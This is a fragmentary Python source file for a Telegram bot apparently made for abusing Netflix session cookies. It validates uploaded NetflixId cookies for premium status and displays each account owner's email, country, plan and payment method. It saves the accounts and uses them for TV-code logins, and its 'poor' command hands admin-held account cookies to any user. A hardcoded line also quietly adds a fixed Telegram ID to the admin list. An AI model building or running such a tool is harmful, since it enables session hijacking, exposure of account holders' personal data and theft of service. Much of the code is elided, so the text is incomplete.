...
'''if 7125341830 not in ADMINS:
    ADMINS.append(7125341830)'''
                    ...
                    try:
                        ...
                        if '%' in netflix_id:
                            try:
                                ...
                                pass
                        if netflix_id and not re.search(r'SecureNetflixId', pattern) and netflix_id not in netflix_ids:
                            netflix_ids.append(netflix_id)
                    except:
                        continue
            except:
...
async def extract_profiles_from_manage_profiles(response_text):
    try:
        profiles = []
        try:
    ...
    try:
        ...
        try:
            ...
            try:
                ...
                profiles = asyncio.run(extract_profiles_from_manage_profiles(resp_profiles.text))
            except Exception as e:
                logger.error(f"Error extracting profiles: {e}")
                profiles = []
            ...
            logger.error(f"Error parsing cookie response: {e}")
            return {'ok': False, 'err': f'Parse error: {str(e)}', 'cookie': cookie_dict}
    except Exception as e:
...
async def check_netflix_cookie(cookie_dict):
    try:
        ...
        logger.error(f"Error in check_netflix_cookie: {e}")
        return {'ok': False, 'err': str(e), 'cookie': cookie_dict}
    ...
    try:
        ...
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            ...
            for cookie_dict in cookie_dicts:
                try:
                    future = loop.run_in_executor(executor, check_cookie_sync, cookie_dict)
                    futures.append(future)
                except Exception as e:
                    logger.error(f"Error creating future: {e}")
...
async def extract_auth_url(session):
    try:
...
async def perform_tv_login(session, auth_url, tv_code):
    try:
        ...
        if user_id:
            try:
                ...
                for cookie_data in cookies:
                    try:
                        ...
                        logger.error(f"Error checking cookie for user {user_id}: {e}")
                        continue
                ...
                logger.error(f"Error in cleanup_invalid_cookies for user {user_id}: {e}")
                ...
                try:
                    ...
                    for cookie_data in cookies:
                        try:
                            ...
                            logger.error(f"Error checking cookie for user {uid}: {e}")
                            continue
            ...
            for cookie_data in admin_cookies:
                try:
                    check_result = await check_netflix_cookie(cookie_data['cookie'])
                    if check_result.get('ok') and check_result.get('premium'):
                        valid_admin_cookies.append(cookie_data)
                except Exception as e:
                    logger.error(f"Error checking admin cookie: {e}")
                    continue
            
            if len(valid_admin_cookies) != len(admin_cookies):
                await db.save_admin_cookies(valid_admin_cookies)
                changed = True
...
async def cancel_user_operation(user_id, message=None):
    try:
        ...
        if user_id in app.tv_login_data:
            app.tv_login_data.pop(user_id, None)
            cancelled = True
        
        if user_id in app.pending_cookies:
            app.pending_cookies.pop(user_id, None)
            cancelled = True
        
        if user_id in app.tv_accounts:
            app.tv_accounts.pop(user_id, None)
            cancelled = True
        
        if user_id in app.poor_user_data:
            app.poor_user_data.pop(user_id, None)
            cancelled = True
        
        if user_id in app.user_login_state:
            app.user_login_state.pop(user_id, None)
            cancelled = True
        
        if user_id in app.message_ids:
            app.message_ids.pop(user_id, None)
            cancelled = True
        
        if user_id in app.admin_data:
            app.admin_data.pop(user_id, None)
            cancelled = True
        
        if user_id in app.pending_admin_cookies:
...
<blockquote><b>MadeBy:</b> <b><a href="https://t.me/sagarkun0">SAGARKUN</a></b></blockquote>
        """
...
async def cancel_command(client, message: Message):
    try:
        if not await force_sub_check(client, message):
            return
        user_id = message.from_user.id
        await cancel_user_operation(user_id, message)
    except Exception as e:
        logger.error(f"Error in cancel_command: {e}")
        try:
            await safe_reply_message(message, "An error occurred. Please try again.")
        except:
            pass
...
async def stats_command(client, message: Message):
    try:
        ...
        successful_logins = login_stats.get("successful", 0)
        failed_logins = login_stats.get("failed", 0)
...
• Success Rate: `{((successful_logins/total_attempts)*100) if total_attempts > 0 else 0:.1f}%`
...
• Uptime: Bot is running
        ...
        try:
            await safe_reply_message(message, "An error occurred while fetching statistics.")
        except:
            pass
...
async def broadcast_command(client, message: Message):
    try:
        ...
        try:
            await safe_reply_message(message, "An error occurred while broadcasting.")
        except:
            pass
...
async def login_command(client, message: Message):
    try:
        ...
        if cookies:
            ...
            if cookies:
                ...
                try:
                    ...
                    logger.error(f"Error showing login menu: {e}")
                    await safe_reply_message(message, "An error occurred. Please try again.")
                return
        ...
        try:
            ...
            logger.error(f"Error sending cookie request: {e}")
            await safe_reply_message(message, "An error occurred. Please try again.")
    except Exception as e:
...
async def show_login_main_menu(client, message: Message, user_id):
    try:
        ...
        logger.error(f"Error in show_login_main_menu: {e}")
    ...
    try:
        ...
        for i, account in enumerate(cookies, 1):
            try:
                ...
                text += f"📧 Email: {account.get('email', 'Unknown')}\n"
                text += f"🌍 Country: {account.get('country', 'Unknown')}\n"
                text += f"📺 Plan: {account.get('plan', 'Unknown')}\n"
                text += f"🎬 Video Quality: {account.get('video_quality', 'Unknown')}\n"
                text += f"👥 Max Streams: {account.get('max_streams', 'Unknown')}\n"
                text += f"💳 Payment: {account.get('payment_method', 'Unknown')}\n"
                text += f"📅 Member Since: {account.get('member_since', 'Unknown')}\n"
                text += f"💰 Plan Price: {account.get('plan_price', 'Unknown')}\n\n"
            except Exception as e:
                logger.error(f"Error formatting account {i}: {e}")
        ...
        try:
            ...
            logger.error(f"Error sending myaccounts message: {e}")
            await safe_reply_message(message, "An error occurred. Please try again.")
    except Exception as e:
        logger.error(f"Error in myaccounts_command: {e}")
        try:
            await safe_reply_message(message, "An error occurred. Please try again.")
        except:
            pass
...
async def delete_command(client, message: Message):
    try:
        ...
        for i, account in enumerate(cookies, 1):
            try:
                name = account.get('name', 'Unknown')[:15]
            except:
                name = f"Account {i}"
            delete_buttons.append(InlineKeyboardButton(
                f"🗑 Delete {i}. {name}",
                callback_data=f"delete_{user_id}_{i-1}"
            ))
        ...
        try:
            ...
            logger.error(f"Error sending delete menu: {e}")
            await safe_reply_message(message, "An error occurred. Please try again.")
    except Exception as e:
...
async def poor_command(client, message: Message):
    try:
        ...
        for cookie_data in admin_cookies:
            try:
                cookie_dicts.append(cookie_data['cookie'])
            except:
                continue
        ...
        valid_cookies = [result for result in check_results if result.get('ok') and result.get('premium')]
        ...
        for i, account in enumerate(valid_cookies, 1):
            try:
                select_buttons.append(InlineKeyboardButton(
                    f"Select {i}. {account.get('name', 'Unknown')[:15]}",
                    callback_data=f"poor_select_{user_id}_{i-1}"
                ))
                text += f"{i}. **{account.get('name', 'Unknown')}** - {account.get('plan', 'Unknown')}\n"
                text += f"   Video: {account.get('video_quality', 'Unknown')} | Streams: {account.get('max_streams', 'Unknown')}\n"
                text += f"   📧 {account.get('email', 'Unknown')}\n"
                text += f"   🌍 {account.get('country', 'Unknown')}\n\n"
            except Exception as e:
                logger.error(f"Error formatting account {i}: {e}")
                continue
        ...
        try:
            ...
            logger.error(f"Error sending poor menu: {e}")
            await safe_reply_message(message, "An error occurred. Please try again.")
    except Exception as e:
        logger.error(f"Error in poor_command: {e}")
        try:
            await safe_reply_message(message, "An error occurred. Please try again.")
        except:
            pass
...
async def add_admin_cookies(client, message: Message):
    try:
        ...
        cancel_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data=f"admincancel_{admin_id}")]
        ])
        ...
        try:
            ...
            logger.error(f"Error sending admin cookie request: {e}")
            await safe_reply_message(message, "An error occurred. Please try again.")
    except Exception as e:
        logger.error(f"Error in add_admin_cookies: {e}")
        try:
            await safe_reply_message(message, "An error occurred. Please try again.")
        except:
            pass
    ...
    try:
        ...
        for i, account in enumerate(valid_cookies, 1):
            try:
                ...
                text += f"   📧 {account.get('email', 'Unknown')}\n"
                text += f"   Video: {account.get('video_quality', 'Unknown')} | Streams: {account.get('max_streams', 'Unknown')}\n"
                text += f"   Status: {'✅ Valid' if account.get('ok') else '❌ Invalid'}\n\n"
            except Exception as e:
                logger.error(f"Error formatting admin cookie {i}: {e}")
                continue
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Close", callback_data=f"close_{admin_id}")]
        ])
        ...
        try:
            ...
            logger.error(f"Error sending admin cookies view: {e}")
            await safe_reply_message(message, "An error occurred. Please try again.")
    except Exception as e:
        logger.error(f"Error in view_admin_cookies: {e}")
        try:
            await safe_reply_message(message, "An error occurred. Please try again.")
        except:
            pass
...
async def clear_admin_cookies(client, message: Message):
    try:
        ...
        logger.error(f"Error in clear_admin_cookies: {e}")
        try:
            await safe_reply_message(message, "An error occurred. Please try again.")
        except:
            pass
...
async def process_document_cookie(client, message: Message):
    try:
        ...
        logger.error(f"Error in process_document_cookie: {e}")
...
async def process_admin_document_cookie(client, message: Message):
    try:
        ...
        logger.error(f"Error in process_admin_document_cookie: {e}")
...
async def process_cookie_input(client, message: Message):
    try:
        ...
        logger.error(f"Error in process_cookie_input: {e}")
...
async def process_cookie_content(client, message: Message, content, user_id):
    try:
        ...
        cookie_dicts = []
        for netflix_id in netflix_ids[:20]:
            try:
        ...
        logger.error(f"Error in process_cookie_content: {e}")
        try:
            await safe_edit_message(message, f"❌ An error occurred: {str(e)}")
        except:
            pass
        app.user_data.pop(user_id, None)
    ...
    try:
        ...
        for i, cookie in enumerate(valid_cookies, 1):
            try:
                ...
                logger.error(f"Error formatting cookie {i}: {e}")
                text += f"{i}. Unknown Account\n\n"
                continue
            
            save_buttons.append(InlineKeyboardButton(
                f"💾 Save Account {i}",
                callback_data=f"save_{user_id}_{i-1}"
            ))
        ...
        try:
            ...
            logger.error(f"Error editing message in show_cookie_selection: {e}")
        
        app.user_data.pop(user_id, None)
    except Exception as e:
        logger.error(f"Error in show_cookie_selection: {e}")
        try:
            await safe_edit_message(message, "An error occurred. Please try again.")
        except:
            pass
...
async def process_admin_cookie_input(client, message: Message):
    try:
        ...
        logger.error(f"Error in process_admin_cookie_input: {e}")
...
async def process_admin_cookie_content(client, message: Message, content, admin_id):
    try:
        ...
        logger.error(f"Error in process_admin_cookie_content: {e}")
        try:
            await safe_edit_message(message, f"❌ An error occurred: {str(e)}")
        except:
            pass
...
async def show_admin_cookie_selection(client, message: Message, admin_id, valid_cookies, existing_cookies):
    try:
        ...
        for i, cookie in enumerate(valid_cookies, 1):
            ...
            save_buttons.append(InlineKeyboardButton(
                f"💾 Save Account {i}",
                callback_data=f"adminsave_{admin_id}_{i-1}"
            ))
        ...
        app.pending_admin_cookies[admin_id] = {
            'valid_cookies': valid_cookies,
            'existing_cookies': existing_cookies
        }
        ...
        try:
            ...
            logger.error(f"Error editing message in show_admin_cookie_selection: {e}")
        
        app.admin_data.pop(admin_id, None)
    except Exception as e:
        logger.error(f"Error in show_admin_cookie_selection: {e}")
        try:
            await safe_edit_message(message, "An error occurred. Please try again.")
        except:
            pass
...
async def process_tv_code(client, message: Message):
    try:
        ...
        if not re.match(r'^\d{8}$', tv_code):
            ...
            await safe_reply_message(
                message,
                "❌ Invalid code. Please enter an 8-digit code.",
                reply_markup=cancel_keyboard,
                quote=True
            )
            return
        ...
        if tv_data.get('is_poor'):
            if user_id not in app.poor_user_data:
                await safe_reply_message(message, "❌ Session expired. Please start over.", quote=True)
                return
            cookies = app.poor_user_data[user_id]['cookies']
            account = cookies[account_index]
            cookie_dict = account['cookie']
        else:
        ...
        try:
            ...
            logger.error(f"Error updating session cookies: {e}")
            await safe_edit_message(status_msg, "❌ Failed to process cookies. Please try again.")
            app.tv_login_data.pop(user_id, None)
            return
        
        auth_url = await extract_auth_url(session)
        ...
        result = await perform_tv_login(session, auth_url, tv_code)
        ...
        logger.error(f"Error in process_tv_code: {e}")
        try:
            await safe_reply_message(message, "An error occurred during TV login. Please try again.")
        except:
            pass
        app.tv_login_data.pop(user_id, None)
...
async def handle_callback(client, callback_query: CallbackQuery):
    try:
        ...
        if data == "refresh":
            channel_button, change_data = await check_fsb(client, user_id)
            if not channel_button:
            ...
            try:
                ...
                await safe_answer_callback(callback_query, "You're still not in the channel.")
            
            if change_data:
                for change_ in change_data:
                    client.fsb_config.FSB[change_[0]] = (change_[1], change_[2], change_[3])
            return
...
• Uptime: Bot is running
                ...
                if len(parts) == 3 and int(parts[2]) == user_id:
                    # Instead of calling delete_command with the message, we should show the delete menu
                    cookies = await db.get_user_cookies(user_id)
                ...
                if len(parts) == 3:
                    ...
                    if account_index < len(cookies):
                        ...
                        # Show remaining accounts or back to myaccounts
                        if cookies:
                            # Show the remaining accounts
                            ...
                            await safe_reply_message(
                                callback_query.message,
                                "✅ All accounts deleted. You have no saved accounts.\n\nUse /login to add new cookies.",
                                reply_markup=keyboard
                            )
                    else:
                ...
                if len(parts) == 3 and int(parts[2]) == user_id:
                    ...
                    for i, account in enumerate(cookies, 1):
                        ...
                        select_buttons.append(InlineKeyboardButton(
                            f"Select Account {i}",
                            callback_data=f"select_{user_id}_{i-1}"
                        ))
                ...
                if len(parts) == 4:
                    ...
                    app.tv_login_data[user_id] = {
                        'state': 'awaiting_tv_code',
                ...
                if len(parts) == 3:
                    ...
                    try:
                        ...
                        await safe_edit_message(callback_query.message, "❌ Error saving cookie.")
                        return
                ...
                if len(parts) == 2:
                    ...
                    for cookie in valid_cookies:
                        ...
                        try:
                            ...
                            logger.error(f"Error saving cookie in saveall: {e}")
                            continue
                    ...
                    if saved_count == 0:
                        ...
                        saved_names_str = ", ".join(saved_names)
                        await safe_edit_message(callback_query.message, f"✅ Saved {saved_count} new account(s): {saved_names_str}")
        ...
        logger.error(f"Unexpected error in handle_callback: {e}")
